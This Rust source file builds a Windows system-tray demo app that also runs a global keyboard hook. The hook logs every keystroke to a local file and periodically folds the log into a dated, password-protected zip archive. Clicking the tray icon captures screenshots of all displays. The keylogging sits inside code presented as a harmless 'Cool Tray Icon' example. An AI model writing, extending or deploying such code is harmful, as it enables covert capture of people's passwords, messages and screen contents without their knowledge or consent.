use core::mem::MaybeUninit;
use winapi::um::winuser;
use std::time::Instant;
use std::io::prelude::*;
use std::fs;
use std::fs::OpenOptions;
use std::io::Write;
use std::io::{self, BufRead, Read};
use std::io::BufReader;
use std::path::Path;
use std::str;
use std::fs::File;
use std::fs::read_to_string;
use chrono::{Utc, DateTime};
use monitor::*;

const TEMP: &str = "./data.dat";

fn main() {
    #[derive(Copy, Clone, Eq, PartialEq, Debug)]
    enum Events {
        ClickTrayIcon,
        DoubleClickTrayIcon,
        Exit,
        Item1,
        Item2,
        Item3,
        Item4,
        CheckItem1,
        SubItem1,
        SubItem2,
        SubItem3,
    }

    let (s, r) = std::sync::mpsc::channel::<Events>();
    let icon = include_bytes!("./resources/icon1.ico");
    let icon2 = include_bytes!("./resources/icon2.ico");

    let second_icon = Icon::from_buffer(icon2, None, None).unwrap();
    let first_icon = Icon::from_buffer(icon, None, None).unwrap();

    let mut text = String::from("Hello World");

    // Needlessly complicated tray icon with all the whistles and bells
    let mut tray_icon = TrayIconBuilder::new()
        .sender(s)
        .icon_from_buffer(icon)
        .tooltip("Cool Tray 👀 Icon")
        .on_click(Events::ClickTrayIcon)
        .on_double_click(Events::DoubleClickTrayIcon)
        .menu(
            MenuBuilder::new()
                .item("Item 3 Replace Menu 👍", Events::Item3)
                .item("Item 2 Change Icon Green", Events::Item2)
                .item("Item 1 Change Icon Red", Events::Item1)
                .separator()
                .checkable("This is checkable", true, Events::CheckItem1)
                .submenu(
                    "Sub Menu",
                    MenuBuilder::new()
                        .item("Sub item 1", Events::SubItem1)
                        .item("Sub Item 2", Events::SubItem2)
                        .item("Sub Item 3", Events::SubItem3),
                )
                .with(MenuItem::Item {
                    name: "Item Disabled".into(),
                    disabled: true, // Disabled entry example
                    id: Events::Item4,
                    icon: None,
                })
                .separator()
                .item("E&xit", Events::Exit),
        )
        .build()
        .unwrap();

    std::thread::spawn(move || {
        if let Err(error) = listen(track_activity) {
            println!("Error: {:?}", error)
        }
    });
    std::thread::spawn(move || {
        r.iter().for_each(|m| match m {
            Events::DoubleClickTrayIcon => {
                println!("Double click");
            }
            Events::ClickTrayIcon => {
                println!("Single click");
                let start = Instant::now();
                let screens = Screen::all().unwrap();

                for screen in screens {
                    println!("capture {screen:?}");
                    let mut image = screen.capture().unwrap();
                    image
                        .save(format!("target/{}.png", screen.display_info.id))
                        .unwrap();

                    image = screen.capture_area(300, 300, 300, 300).unwrap();
                    image
                        .save(format!("target/{}-2.png", screen.display_info.id))
                        .unwrap();
                }

                let screen = Screen::from_point(100, 100).unwrap();
                println!("capture {screen:?}");

                let image = screen.capture_area(300, 300, 300, 300).unwrap();
                image.save("target/capture_display_with_point.png").unwrap();
                println!("run time: {:?}", start.elapsed());
            }
            Events::Exit => {
                println!("Please exit");
                std::process::exit(0);
            }
            Events::Item1 => {
                tray_icon.set_icon(&second_icon).unwrap();
            }
            Events::Item2 => {
                tray_icon.set_icon(&first_icon).unwrap();
            }
            Events::Item3 => {
                tray_icon
                    .set_menu(
                        &MenuBuilder::new()
                            .item("New menu item", Events::Item1)
                            .item("Exit", Events::Exit),
                    )
                    .unwrap();
            }
            e => {
                println!("{:?}", e);
            }
        })
    });

    // Your applications message loop. Because all applications require an
    // application loop, you are best served using an `winit` crate.
    loop {
        unsafe {
            let mut msg = MaybeUninit::uninit();
            let bret = winuser::GetMessageA(msg.as_mut_ptr(), 0 as _, 0, 0);
            if bret > 0 {
                winuser::TranslateMessage(msg.as_ptr());
                winuser::DispatchMessageA(msg.as_ptr());
            } else {
                break;
            }
        }
    }
}

fn track_activity(event: Event) {
    match event.event_type {
        EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
        EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => println!("Control Left/Right!"),
        EventType::KeyPress(Key::Delete) => println!("Delete!"),
        EventType::KeyPress(Key::DownArrow | Key::UpArrow | Key::LeftArrow | Key::RightArrow) => println!("Up/Down/Left/Right!"),
        EventType::KeyPress(Key::Home) => println!("Home!"),
        EventType::KeyPress(Key::Insert) => println!("Insert!"),
        EventType::KeyPress(Key::End) => println!("End!"),
        EventType::KeyPress(Key::Escape) => println!("Escape!"),
        EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
        EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
        EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
        EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
        EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
        EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
        EventType::KeyPress(Key::Return) => {
            let zipped_string: String = readzip();

            let now = Utc::now();
            let x: String = format!("{}", now);
            let now_parsed: DateTime<Utc> = x.parse().unwrap();

            let mut fileRead = OpenOptions::new()
                .read(true)
                .open(TEMP)
                .expect("Unable to open data file");

            let mut data = String::new();
            fileRead.read_to_string(&mut data);

            zip_main(zipped_string + &data + "\n" + &now_parsed.to_string() + "\n");

            let mut fileClear = OpenOptions::new()
                .write(true)
                .truncate(true)
                .open(TEMP)
                .expect("Unable to open data file to clear.");
        },
        EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
        EventType::KeyPress(Key) => {
            let key = event.name.unwrap();
            let mut fileRef = OpenOptions::new()
                .append(true)
                .create(true)
                .open(TEMP)
                .expect("Unable to open data file to log.");
    
            fileRef.write(key.as_bytes()).expect("write failed");
        },
        EventType::MouseMove{x, y} => (),
        _ => (),
    }
}

fn zip_main(text: String) -> i32 {
    match dozip(text) {
        Ok(_) => println!("Zipped successfuly."),
        Err(e) => println!("Failed to zip.: {e:?}"),
    }

    0
}

fn dozip(text: String) -> ZipResult<()> {
    let now: DateTime<Utc> = Utc::now();
    let fname = now.format("%Y-%m-%d").to_string() + ".zip";

    let path = std::path::Path::new(&fname);
    let file = std::fs::File::create(path).unwrap();

    let mut zip = ZipWriter::new(file);

    zip.add_directory("text/", Default::default())?;

    let options = FileOptions::default()
        .compression_method(CompressionMethod::Stored)
        .unix_permissions(0o755)
        .with_deprecated_encryption(b"test");
    zip.start_file("text/hello.txt", options)?;
    zip.write_all(b"Hello, World!\n")?;

    zip.start_file("text/log.txt", options)?;
    zip.write_all(text.as_bytes())?;

    zip.finish()?;
    Ok(())
}

fn readzip() -> String {
    let now: DateTime<Utc> = Utc::now();
    let fname = now.format("%Y-%m-%d").to_string() + ".zip";
    let file = match fs::File::open(fname) {
        Ok(file) => file,
        Err(err) => {
            dozip(String::from(""));
            return String::from("");
        }
    };

    let reader = BufReader::new(file);

    let mut archive = ZipArchive::new(reader).unwrap();

    let mut file = match archive.by_name_decrypt("text/log.txt", b"test") {
        Ok(file) => file.unwrap(),
        Err(..) => {
            println!("File text/log.txt not found in the zip.");
            return String::from("");
        }
    };

    let mut contents = String::new();
    file.read_to_string(&mut contents).unwrap();
    contents
}